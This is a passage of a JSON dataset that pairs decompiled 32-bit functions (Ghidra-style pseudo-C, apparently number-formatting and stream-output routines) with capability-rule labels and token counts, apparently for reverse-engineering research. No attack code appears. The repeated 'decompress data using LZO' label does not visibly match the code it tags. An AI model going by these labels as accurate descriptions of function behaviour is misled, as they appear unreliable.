iVar4) = var_60h;\n        *(&stack0xffffff70 + iVar4) = uVar2;\n        iVar5 = (**(iVar5 + 0x30))();\n        iVar4 = var_50h;\n        if (iVar6 != iVar5) goto code_r0x00456d90;\n    }\n    auStackY148[1] = var_58h;\n    auStackY148[0] = 0x456ce3;\n    var_4ch = iVar4;\n    iVar4 = (**(*arg_8h + 0x30))();\n    var_4ch = var_4ch != iVar4;\ncode_r0x00456cef:\n    return CONCAT44(arg_ch & 0xffffff00 | var_4ch & 0xff, arg_8h);\n}\n",
        "token_count": 1436
    },
    "00456f20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00456f20(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    ushort *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uint uVar13;\n    ushort *puVar14;\n    ulong uVar15;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar auStack73 [5];\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    ushort *var_38h;\n    uint var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_30h = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x456f4c;\n    iVar5 = fcn.0042e500(arg_10h + 0x6c);\n    var_2ch = iVar5 + 0x28;\n    uVar8 = *(arg_10h + 0xc);\n    uStackY116 = 0x456f67;\n    iVar6 = fcn.00418950();\n    iVar6 = -iVar6;\n    puVar11 = &stack0xffffff90 + iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    var_40h = uVar8 & 0x4a;\n    uVar4 = var_40h != 0x40 && var_40h != 8;\n    var_2ch = var_2ch & 0xffffff00 | uVar4;\n    iVar7 = arg_18h;\n    if (arg_18h < 1) {\n        iVar7 = -arg_18h;\n        if (var_40h == 0x40 || var_40h == 8) {\n            iVar7 = arg_18h;\n        }\n    }\n    *(&stack0xffffff94 + iVar6) = iVar7;\n    *(&stack0xffffff98 + iVar6) = iVar5 + 0x28;\n    *(&stack0xffffffa0 + iVar6) = uVar4;\n    *(&stack0xffffff9c + iVar6) = uVar8;\n    *(&stack0xffffff90 + iVar6) = (&stack0xffffffb7 + iVar6 & 0xfffffff0) + 0x14;\n    var_38h = &stack0xffffffb7 + iVar6 & 0xfffffff0;\n    *(&stack0xffffff8c + iVar6) = 0x456fbd;\n    iVar7 = fcn.0049d770();\n    if (*(iVar5 + 0x10) == '\\0') {\n        puVar10 = var_38h + (0x14 - iVar7);\n        puVar14 = var_38h + (0x14 - iVar7);\n        if (var_2ch != '\\0') goto code_r0x00456fe0;\ncode_r0x00457111:\n        puVar14 = puVar10;\n        if (((uVar8 & 0x200) != 0) && (arg_18h != 0)) {\n            if (var_40h == 0x40) {\n                iVar7 = iVar7 + 1;\n                puVar14 = puVar10 + -1;\n                *puVar14 = *(iVar5 + 0x30);\n            }\n            else {\n                iVar7 = iVar7 + 2;\n                puVar14 = puVar10 + -2;\n                puVar10[-1] = *(iVar5 + 0x28 + ((uVar8 >> 0xe & 1) + 2) * 2);\n                *puVar14 = *(iVar5 + 0x30);\n            }\n        }\ncode_r0x00456ff3:\n        iVar6 = *(arg_10h + 8);\n        puVar11 = puVar12;\n        if (iVar6 <= iVar7) goto code_r0x00456ffd;\n    }\n    else {\n        *(&stack0xffffff8c + iVar6) = 0x4570c4;\n        uVar15 = fcn.00418950();\n        iVar9 = uVar15 >> 0x20;\n        iVar3 = -uVar15;\n        puVar11 = &stack0xffffff90 + iVar3 + iVar6;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar6;\n        *(&stack0xffffffa0 + iVar3 + iVar6) = iVar9;\n        *(&stack0xffffffa4 + iVar3 + iVar6) = iVar9 + iVar7 * 2;\n        puVar14 = (&stack0xffffffb7 + iVar3 + iVar6 & 0xfffffff0) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar6) = *(iVar5 + 0xc);\n        var_38h = puVar14;\n        *(&stack0xffffff98 + iVar3 + iVar6) = *(iVar5 + 8);\n        uVar1 = *(iVar5 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar6) = puVar14;\n        *(&stack0xffffff94 + iVar3 + iVar6) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar6) = 0x4570fc;\n        iVar6 = fcn.0049dab0();\n        iVar7 = iVar6 - var_38h >> 1;\n        puVar10 = var_38h;\n        puVar14 = var_38h;\n        if (var_2ch == '\\0') goto code_r0x00457111;\ncode_r0x00456fe0:\n        puVar12 = puVar11;\n        if (arg_18h < 0) {\n            iVar7 = iVar7 + 1;\n            puVar14[-1] = *(iVar5 + 0x28);\n            puVar14 = puVar14 + -1;\n            goto code_r0x00456ff3;\n        }\n        if ((uVar8 & 0x800) == 0) goto code_r0x00456ff3;\n        iVar7 = iVar7 + 1;\n        puVar14 = puVar14 + -1;\n        *puVar14 = *(iVar5 + 0x2a);\n        iVar6 = *(arg_10h + 8);\n        if (iVar6 <= iVar7) goto code_r0x00456ffd;\n    }\n    *(puVar11 + -4) = 0x457068;\n    uVar15 = fcn.00418950();\n    iVar5 = -uVar15;\n    uVar8 = var_3ch & 0xffff;\n    *(puVar11 + iVar5 + 0x14) = iVar7;\n    *(puVar11 + iVar5 + 4) = uVar8;\n    puVar14 = puVar11 + iVar5 + 0x27 & 0xfffffff0;\n    *(puVar11 + iVar5 + 0xc) = uVar15 >> 0x20;\n    *(puVar11 + iVar5 + 0x10) = iVar6;\n    *(puVar11 + iVar5 + 8) = puVar14;\n    *(puVar11 + iVar5) = arg_10h;\n    *(puVar11 + iVar5 + -4) = 0x457096;\n    fcn.0048c6b0();\n    iVar7 = iVar6;\n    puVar11 = puVar11 + iVar5;\ncode_r0x00456ffd:\n    uVar13 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar6 = *var_30h;\n        puVar11[1] = iVar7;\n        *puVar11 = puVar14;\n        pcVar2 = *(iVar6 + 0x30);\n        puVar11[-1] = 0x45701f;\n        iVar6 = (*pcVar2)();\n        if (iVar6 != iVar7) {\n            uVar13 = 1;\n        }\n    }\n    return CONCAT44(uVar13, var_30h) & 0xffffffffff;\n}\n",
        "token_count": 1952
    },
    "00457170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl fcn.00457170(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    ushort *puVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ulong uVar16;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar uStack73;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    ushort *var_38h;\n    uint var_34h;\n    char var_2dh;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x45719c;\n    iVar4 = fcn.0042e500(arg_10h + 0x6c);\n    uVar8 = *(arg_10h + 0xc);\n    uStackY116 = 0x4571b7;\n    var_44h = iVar4 + 0x28;\n    iVar5 = fcn.00418950();\n    iVar5 = -iVar5;\n    puVar12 = &stack0xffffff90 + iVar5;\n    puVar11 = &stack0xffffff90 + iVar5;\n    uVar6 = uVar8 & 0x4a;\n    *(&stack0xffffff98 + iVar5) = iVar4 + 0x28;\n    var_40h = uVar6;\n    *(&stack0xffffff9c + iVar5) = uVar8;\n    var_38h = &stack0xffffffb7 + iVar5 & 0xfffffff0;\n    var_2dh = uVar6 != 0x40 && uVar6 != 8;\n    *(&stack0xffffffa0 + iVar5) = var_2dh;\n    *(&stack0xffffff94 + iVar5) = arg_18h;\n    *(&stack0xffffff90 + iVar5) = (&stack0xffffffb7 + iVar5 & 0xfffffff0) + 0x14;\n    *(&stack0xffffff8c + iVar5) = 0x4571fd;\n    iVar7 = fcn.0049d770();\n    puVar9 = var_38h + (0x14 - iVar7);\n    if (*(iVar4 + 0x10) != '\\0') {\n        *(&stack0xffffff8c + iVar5) = 0x457282;\n        uVar16 = fcn.00418950();\n        iVar10 = uVar16 >> 0x20;\n        iVar3 = -uVar16;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar5;\n        puVar11 = &stack0xffffff90 + iVar3 + iVar5;\n        *(&stack0xffffffa0 + iVar3 + iVar5) = iVar10;\n        *(&stack0xffffffa4 + iVar3 + iVar5) = iVar10 + iVar7 * 2;\n        puVar9 = (&stack0xffffffb7 + iVar3 + iVar5 & 0xfffffff0) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar5) = *(iVar4 + 0xc);\n        var_38h = puVar9;\n        *(&stack0xffffff98 + iVar3 + iVar5) = *(iVar4 + 8);\n        uVar1 = *(iVar4 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar5) = puVar9;\n        *(&stack0xffffff94 + iVar3 + iVar5) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar5) = 0x4572ba;\n        iVar5 = fcn.0049dab0();\n        iVar7 = iVar5 - var_38h >> 1;\n        puVar9 = var_38h;\n    }\n    puVar15 = puVar9;\n    if (((var_2dh == '\\0') && (puVar12 = puVar11,  (uVar8 & 0x200) != 0)) && (arg_18h != 0)) {\n        if (var_40h == 0x40) {\n            iVar7 = iVar7 + 1;\n            puVar15 = puVar9 + -1;\n            *puVar15 = *(iVar4 + 0x30);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            puVar15 = puVar9 + -2;\n            puVar9[-1] = *(var_44h + ((uVar8 >> 0xe & 1) + 2) * 2);\n            *puVar15 = *(iVar4 + 0x30);\n        }\n    }\n    iVar5 = *(arg_10h + 8);\n    puVar13 = puVar12;\n    if (iVar7 < iVar5) {\n        *(puVar12 + -4) = 0x457323;\n        uVar16 = fcn.00418950();\n        iVar4 = -uVar16;\n        puVar13 = puVar12 + iVar4;\n        uVar8 = var_3ch & 0xffff;\n        *(puVar12 + iVar4 + 0x14) = iVar7;\n        *(puVar12 + iVar4 + 4) = uVar8;\n        puVar15 = puVar12 + iVar4 + 0x27 & 0xfffffff0;\n        *(puVar12 + iVar4 + 0xc) = uVar16 >> 0x20;\n        *(puVar12 + iVar4 + 0x10) = iVar5;\n        *(puVar12 + iVar4 + 8) = puVar15;\n        *(puVar12 + iVar4) = arg_10h;\n        *(puVar12 + iVar4 + -4) = 0x457351;\n        fcn.0048c6b0();\n        iVar7 = iVar5;\n    }\n    uVar14 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar5 = *var_2ch;\n        puVar13[1] = iVar7;\n        *puVar13 = puVar15;\n        pcVar2 = *(iVar5 + 0x30);\n        puVar13[-1] = 0x45724c;\n        iVar5 = (*pcVar2)();\n        if (iVar5 != iVar7) {\n            uVar14 = 1;\n        }\n    }\n    return CONCAT44(uVar14, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1611
    },
    "00457370": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00457370(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint uVar15;\n    ushort *puVar16;\n    ushort *puVar17;\n    ulong uVar18;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_38h = arg_8h;\n    var_2ch = arg_1ch;\n    var_40h = arg_ch;\n    var_44h = arg_14h;\n    var_30h = arg_18h;\n    iStackY112 = 0x4573aa;\n    iVar4 = fcn.0042e500(arg_10h + 0x6c);\n    var_34h = iVar4 + 0x28;\n    var_48h = *(arg_10h + 0xc);\n    uStackY116 = 0x4573c8;\n    var_3ch = var_48h;\n    iVar5 = fcn.00418950();\n    iVar5 = -iVar5;\n    puVar12 = &stack0xffffff90 + iVar5;\n    puVar13 = &stack0xffffff90 + iVar5;\n    var_48h = var_48h & 0x4a;\n    uVar14 = &fcn.00457370::var_48h + iVar5 + 3 & 0xfffffff0;\n    bVar9 = var_48h != 0x40 && var_48h != 8;\n    uVar8 = bVar9;\n    var_34h = var_34h & 0xffffff00 | uVar8;\n    uVar6 = var_30h;\n    uVar10 = var_2ch;\n    if ((((var_2ch - 1) + (var_30h != 0) | var_2ch) < 0) && (bVar9)) {\n        uVar6 = -var_30h;\n        uVar10 = -(var_2ch + (var_30h != 0));\n    }\n    *(&stack0xffffff94 + iVar5) = uVar6;\n    *(&stack0xffffff98 + iVar5) = uVar10;\n    *(&stack0xffffffa4 + iVar5) = uVar8;\n    uVar8 = var_3ch;\n    *(&stack0xffffff90 + iVar5) = uVar14 + 0x50;\n    *(&stack0xffffffa0 + iVar5) = uVar8;\n    *(&stack0xffffff9c + iVar5) = iVar4 + 0x28;\n    *(&stack0xffffff8c + iVar5) = 0x457433;\n    iVar7 = fcn.0049d820();\n    puVar16 = uVar14 + (0x28 - iVar7) * 2;\n    if (*(iVar4 + 0x10) == '\\0') {\n        if (var_34h != '\\0') goto code_r0x00457453;\ncode_r0x0045758b:\n        puVar17 = puVar16;\n        if (((var_3ch & 0x200) != 0) && ((var_30h | var_2ch) != 0)) {\n            if (var_48h == 0x40) {\n                iVar7 = iVar7 + 1;\n                puVar17 = puVar16 + -1;\n                *puVar17 = *(iVar4 + 0x30);\n            }\n            else {\n                iVar7 = iVar7 + 2;\n                puVar17 = puVar16 + -2;\n                puVar16[-1] = *(iVar4 + 0x28 + ((var_3ch >> 0xe & 1) + 2) * 2);\n                *puVar17 = *(iVar4 + 0x30);\n            }\n        }\ncode_r0x00457467:\n        iVar5 = *(arg_10h + 8);\n        puVar12 = puVar13;\n        if (iVar5 <= iVar7) goto code_r0x00457471;\n    }\n    else {\n        *(&stack0xffffff8c + iVar5) = 0x457544;\n        uVar18 = fcn.00418950();\n        iVar11 = uVar18 >> 0x20;\n        iVar3 = -uVar18;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar5;\n        puVar13 = &stack0xffffff90 + iVar3 + iVar5;\n        *(&stack0xffffffa0 + iVar3 + iVar5) = iVar11;\n        *(&stack0xffffffa4 + iVar3 + iVar5) = iVar11 + iVar7 * 2;\n        puVar16 = (&fcn.00457370::var_48h + iVar3 + iVar5 + 3 & 0xfffffff0U) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar5) = *(iVar4 + 0xc);\n        *(&stack0xffffff98 + iVar3 + iVar5) = *(iVar4 + 8);\n        uVar1 = *(iVar4 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar5) = puVar16;\n        *(&stack0xffffff94 + iVar3 + iVar5) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar5) = 0x457579;\n        iVar5 = fcn.0049dab0();\n        iVar7 = iVar5 - puVar16 >> 1;\n        if (var_34h == '\\0') goto code_r0x0045758b;\ncode_r0x00457453:\n        puVar13 = puVar12;\n        if (var_2ch < 0) {\n            iVar7 = iVar7 + 1;\n            puVar16[-1] = *(iVar4 + 0x28);\n            puVar17 = puVar16 + -1;\n            goto code_r0x00457467;\n        }\n        puVar17 = puVar16;\n        if ((var_3ch & 0x800) == 0) goto code_r0x00457467;\n        iVar7 = iVar7 + 1;\n        puVar17 = puVar16 + -1;\n        *puVar17 = *(iVar4 + 0x2a);\n        iVar5 = *(arg_10h + 8);\n        if (iVar5 <= iVar7) goto code_r0x00457471;\n    }\n    *(puVar12 + -4) = 0x4574e6;\n    uVar18 = fcn.00418950();\n    iVar4 = -uVar18;\n    uVar8 = var_44h & 0xffff;\n    *(puVar12 + iVar4 + 0x14) = iVar7;\n    *(puVar12 + iVar4 + 4) = uVar8;\n    puVar17 = puVar12 + iVar4 + 0x27 & 0xfffffff0;\n    *(puVar12 + iVar4 + 0xc) = uVar18 >> 0x20;\n    *(puVar12 + iVar4 + 0x10) = iVar5;\n    *(puVar12 + iVar4 + 8) = puVar17;\n    *(puVar12 + iVar4) = arg_10h;\n    *(puVar12 + iVar4 + -4) = 0x457514;\n    fcn.0048c6b0();\n    iVar7 = iVar5;\n    puVar12 = puVar12 + iVar4;\ncode_r0x00457471:\n    uVar15 = var_40h;\n    *(arg_10h + 8) = 0;\n    if (var_40h == '\\0') {\n        iVar5 = *var_38h;\n        puVar12[1] = iVar7;\n        *puVar12 = puVar17;\n        pcVar2 = *(iVar5 + 0x30);\n        puVar12[-1] = 0x457493;\n        iVar5 = (*pcVar2)();\n        if (iVar5 != iVar7) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_38h) & 0xffffffffff;\n}\n",
        "token_count": 2058
    },
    "004575f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.004575f0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    ushort *puVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    ushort *puVar16;\n    ulong uVar17;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    ushort *var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_44h = arg_18h;\n    var_38h = arg_ch;\n    var_40h = arg_14h;\n    var_30h = arg_1ch;\n    iStackY112 = 0x457628;\n    iVar4 = fcn.0042e500(arg_10h + 0x6c);\n    var_34h = iVar4 + 0x28;\n    uVar8 = *(arg_10h + 0xc);\n    uStackY116 = 0x457643;\n    iVar5 = fcn.00418950();\n    iVar5 = -iVar5;\n    puVar13 = &stack0xffffff90 + iVar5;\n    puVar12 = &stack0xffffff90 + iVar5;\n    uVar6 = uVar8 & 0x4a;\n    *(&stack0xffffff94 + iVar5) = arg_18h;\n    puVar10 = &fcn.004575f0::var_48h + iVar5 + 3 & 0xfffffff0;\n    var_48h = uVar6;\n    *(&stack0xffffffa0 + iVar5) = uVar8;\n    var_3ch = puVar10;\n    bVar9 = uVar6 != 0x40 && uVar6 != 8;\n    var_34h = var_34h & 0xffffff00 | bVar9;\n    *(&stack0xffffffa4 + iVar5) = bVar9;\n    uVar6 = var_30h;\n    *(&stack0xffffff9c + iVar5) = iVar4 + 0x28;\n    *(&stack0xffffff98 + iVar5) = uVar6;\n    *(&stack0xffffff90 + iVar5) = puVar10 + 0x28;\n    *(&stack0xffffff8c + iVar5) = 0x457690;\n    iVar7 = fcn.0049d820();\n    puVar10 = var_3ch + (0x28 - iVar7);\n    if (*(iVar4 + 0x10) == '\\0') {\n    }\n    else {\n        *(&stack0xffffff8c + iVar5) = 0x457714;\n        uVar17 = fcn.00418950();\n        iVar11 = uVar17 >> 0x20;\n        iVar3 = -uVar17;\n        puVar13 = &stack0xffffff90 + iVar3 + iVar5;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar5;\n        *(&stack0xffffffa0 + iVar3 + iVar5) = iVar11;\n        *(&stack0xffffffa4 + iVar3 + iVar5) = iVar11 + iVar7 * 2;\n        puVar10 = (&fcn.004575f0::var_48h + iVar3 + iVar5 + 3 & 0xfffffff0U) + 4;\n        *(&stack0xffffff9c + iVar3 + iVar5) = *(iVar4 + 0xc);\n        var_3ch = puVar10;\n        *(&stack0xffffff98 + iVar3 + iVar5) = *(iVar4 + 8);\n        uVar1 = *(iVar4 + 0x26);\n        *(&stack0xffffff90 + iVar3 + iVar5) = puVar10;\n        *(&stack0xffffff94 + iVar3 + iVar5) = uVar1;\n        *(&stack0xffffff8c + iVar3 + iVar5) = 0x45774c;\n        iVar5 = fcn.0049dab0();\n        iVar7 = iVar5 - var_3ch >> 1;\n        puVar10 = var_3ch;\n    }\n    puVar16 = puVar10;\n    if (((var_34h == '\\0') && (puVar13 = puVar12,  (uVar8 & 0x200) != 0)) && ((var_44h | var_30h) != 0)) {\n        if (var_48h == 0x40) {\n            iVar7 = iVar7 + 1;\n            puVar16 = puVar10 + -1;\n            *puVar16 = *(iVar4 + 0x30);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            puVar16 = puVar10 + -2;\n            puVar10[-1] = *(iVar4 + 0x28 + ((uVar8 >> 0xe & 1) + 2) * 2);\n            *puVar16 = *(iVar4 + 0x30);\n        }\n    }\n    iVar5 = *(arg_10h + 8);\n    puVar14 = puVar13;\n    if (iVar7 < iVar5) {\n        *(puVar13 + -4) = 0x4577bf;\n        uVar17 = fcn.00418950();\n        iVar4 = -uVar17;\n        puVar14 = puVar13 + iVar4;\n        uVar8 = var_40h & 0xffff;\n        *(puVar13 + iVar4 + 0x14) = iVar7;\n        *(puVar13 + iVar4 + 4) = uVar8;\n        puVar16 = puVar13 + iVar4 + 0x27 & 0xfffffff0;\n        *(puVar13 + iVar4 + 0xc) = uVar17 >> 0x20;\n        *(puVar13 + iVar4 + 0x10) = iVar5;\n        *(puVar13 + iVar4 + 8) = puVar16;\n        *(puVar13 + iVar4) = arg_10h;\n        *(puVar13 + iVar4 + -4) = 0x4577ed;\n        fcn.0048c6b0();\n        iVar7 = iVar5;\n    }\n    uVar15 = var_38h;\n    *(arg_10h + 8) = 0;\n    if (var_38h == '\\0') {\n        iVar5 = *var_2ch;\n        puVar14[1] = iVar7;\n        *puVar14 = puVar16;\n        pcVar2 = *(iVar5 + 0x30);\n        puVar14[-1] = 0x4576df;\n        iVar5 = (*pcVar2)();\n        if (iVar5 != iVar7) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1735
    },
    "004578e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.004578e0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    ushort *puVar8;\n    int32_t *extraout_ECX;\n    char *pcVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uchar *puVar13;\n    char **ppcVar14;\n    uchar *puVar15;\n    ushort *puVar16;\n    uint uVar17;\n    ushort *puVar18;\n    bool bVar19;\n    ulong uVar20;\n    uint64_t in_stack_00000018;\n    uint uStackY148;\n    int32_t iStackY144;\n    char *pcStack136;\n    int32_t iStack132;\n    uchar auStack128 [27];\n    uchar auStack101 [5];\n    char *var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t var_40h;\n    ushort *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_44h = arg_8h;\n    _var_50h = in_stack_00000018;\n    var_48h = arg_ch;\n    var_58h = arg_14h;\n    iStackY144 = 0x457918;\n    var_40h = fcn.0042e500(arg_10h + 0x6c);\n    iVar11 = *(arg_10h + 4);\n    if (iVar11 < 0) {\n        iVar11 = 6;\n    }\n    pcStack136 = arg_18h;\n    iStackY144 = arg_10h;\n    uStackY148 = 0x457949;\n    fcn.0046dfb0();\n    uStackY148 = 0x457961;\n    uVar20 = fcn.00418950();\n    iVar4 = -uVar20;\n    piVar12 = &stack0xffffff70 + iVar4;\n    s = &stack0xffffff9b + iVar4 & 0xfffffff0;\n    if (uVar20 >> 0x20 == 0x104) {\n        *(&stack0xffffff6c + iVar4) = 0x457bea;\n        var_2ch = fcn.0048f260();\n        uVar5 = _var_50h;\n        *(&stack0xffffff7c + iVar4) = &fcn.004578e0::var_28h;\n        puVar16 = s;\n        *(&stack0xffffff78 + iVar4) = 0x2d;\n        *(&stack0xffffff74 + iVar4) = puVar16;\n        *(&stack0xffffff70 + iVar4) = &fcn.004578e0::var_2ch;\n        *(&stack0xffffff80 + iVar4) = uVar5;\n        *(&stack0xffffff6c + iVar4) = 0x457c12;\n        *NULL = fcn.0049df90();\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar4) = 0x457c32;\n            iVar11 = fcn.00418950();\n            iVar11 = -iVar11;\n            piVar12 = &stack0xffffff70 + iVar11 + iVar4;\n            s = &stack0xffffff9b + iVar11 + iVar4 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar11 + iVar4) = 0x457c43;\n            var_2ch = fcn.0048f260();\n            uVar5 = _var_50h;\n            pcVar9 = var_5ch;\n            *(&stack0xffffff7c + iVar11 + iVar4) = &fcn.004578e0::var_28h;\n            puVar16 = s;\n            *(&stack0xffffff78 + iVar11 + iVar4) = pcVar9;\n            *(&stack0xffffff74 + iVar11 + iVar4) = puVar16;\n            *(&stack0xffffff70 + iVar11 + iVar4) = &fcn.004578e0::var_2ch;\n            *(&stack0xffffff80 + iVar11 + iVar4) = uVar5;\n            *(&stack0xffffff6c + iVar11 + iVar4) = 0x457c67;\n            *NULL = fcn.0049df90();\n        }\n    }\n    else {\n        *(&stack0xffffff6c + iVar4) = 0x45797e;\n        var_2ch = fcn.0048f260();\n        uVar5 = _var_50h;\n        *(&stack0xffffff80 + iVar4) = iVar11;\n        puVar16 = s;\n        *(&stack0xffffff7c + iVar4) = &fcn.004578e0::var_28h;\n        *(&stack0xffffff74 + iVar4) = puVar16;\n        *(&stack0xffffff78 + iVar4) = 0x2d;\n        *(&stack0xffffff70 + iVar4) = &fcn.004578e0::var_2ch;\n        *(&stack0xffffff84 + iVar4) = uVar5;\n        *(&stack0xffffff6c + iVar4) = 0x4579aa;\n        *NULL = fcn.0049df90();\n        piVar12 = &stack0xffffff70 + iVar4;\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar4) = 0x457aa5;\n            iVar7 = fcn.00418950();\n            iVar7 = -iVar7;\n            piVar12 = &stack0xffffff70 + iVar7 + iVar4;\n            s = &stack0xffffff9b + iVar7 + iVar4 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar7 + iVar4) = 0x457ab6;\n            var_2ch = fcn.0048f260();\n            uVar5 = _var_50h;\n            pcVar9 = var_5ch;\n            *(&stack0xffffff80 + iVar7 + iVar4) = iVar11;\n            puVar16 = s;\n            *(&stack0xffffff7c + iVar7 + iVar4) = &fcn.004578e0::var_28h;\n            *(&stack0xffffff74 + iVar7 + iVar4) = puVar16;\n            *(&stack0xffffff78 + iVar7 + iVar4) = pcVar9;\n            *(&stack0xffffff70 + iVar7 + iVar4) = &fcn.004578e0::var_2ch;\n            *(&stack0xffffff84 + iVar7 + iVar4) = uVar5;\n            *(&stack0xffffff6c + iVar7 + iVar4) = 0x457ae1;\n            *NULL = fcn.0049df90();\n        }\n    }\n    *piVar12 = arg_10h + 0x6c;\n    piVar12[-1] = 0x4579be;\n    fcn.004a0ae0();\n    piVar12[-1] = 0x4579d2;\n    uVar20 = fcn.00418950();\n    iVar4 = -uVar20;\n    iVar11 = *extraout_ECX;\n    pcVar9 = (uVar20 >> 0x20) + s;\n    *(piVar12 + iVar4) = s;\n    puVar16 = piVar12 + iVar4 + 0x2b & 0xfffffff0;\n    *(piVar12 + iVar4 + 4) = pcVar9;\n    *(piVar12 + iVar4 + 8) = puVar16;\n    pcVar3 = *(iVar11 + 0x2c);\n    puVar13 = piVar12 + iVar4 + -4;\n    *(piVar12 + iVar4 + -4) = 0x4579f2;\n    